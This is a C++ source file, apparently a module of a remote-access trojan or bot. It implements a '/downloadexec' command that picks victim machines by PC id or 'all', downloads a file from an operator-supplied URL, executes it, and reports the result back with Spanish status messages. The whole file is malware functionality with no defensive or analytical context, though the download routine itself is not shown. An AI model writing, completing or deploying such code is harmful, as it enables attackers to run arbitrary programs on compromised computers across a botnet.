#include "application/commands/DownloadExecHandler.hpp"

#include <algorithm>

namespace nuub::application::commands {

DownloadExecHandler::DownloadExecHandler(
    interfaces::IDownloadExecService& dl,
    interfaces::IReporter& reporter,
    std::string pc_id)
    : dl_(dl)
    , reporter_(reporter)
    , pc_id_(std::move(pc_id)) {}

bool DownloadExecHandler::matches(const std::string& target) const {
    std::string lower = target;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    std::string lower_pc = pc_id_;
    std::transform(lower_pc.begin(), lower_pc.end(), lower_pc.begin(), ::tolower);
    return lower == lower_pc || lower == "all";
}

domain::Result<void> DownloadExecHandler::handle_downloadexec(const std::string& target, const std::string& url) {
    if (!matches(target)) return domain::Result<void>::success();

    if (url.empty()) {
        reporter_.send_message("Uso: /downloadexec [target] <url>");
        return domain::Result<void>::success();
    }

    reporter_.send_message("Descargando y ejecutando: " + url);
    auto result = dl_.download_and_execute(url);
    reporter_.send_message(result);
    return domain::Result<void>::success();
}

} // namespace nuub::application::commands
